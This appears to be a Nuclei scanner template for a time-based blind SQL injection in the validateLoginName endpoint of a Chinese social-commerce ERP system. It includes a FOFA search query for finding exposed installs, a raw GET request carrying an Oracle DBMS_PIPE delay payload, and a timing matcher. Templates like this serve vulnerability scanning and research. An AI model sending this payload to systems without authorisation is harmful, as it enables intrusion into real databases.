id: validateLoginName-SQL

info:
  name: validateLoginName-SQL
  author: lengmo
  severity: high
  description: validateLoginName-SQL
  tags: sqli
  metadata:
    fofa-qeury: app="云时空社会化商业ERP系统"
    veified: true
    max-request: 1

http:
  - raw:
      - |
        GET /sys/user/validateLoginName?loginName=admin'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close


               
    matchers:     
      - type: dsl
        dsl:
          - "status_code == 200 && duration>=5 && duration<=8 && contains(header,'Apache-Coyote')" 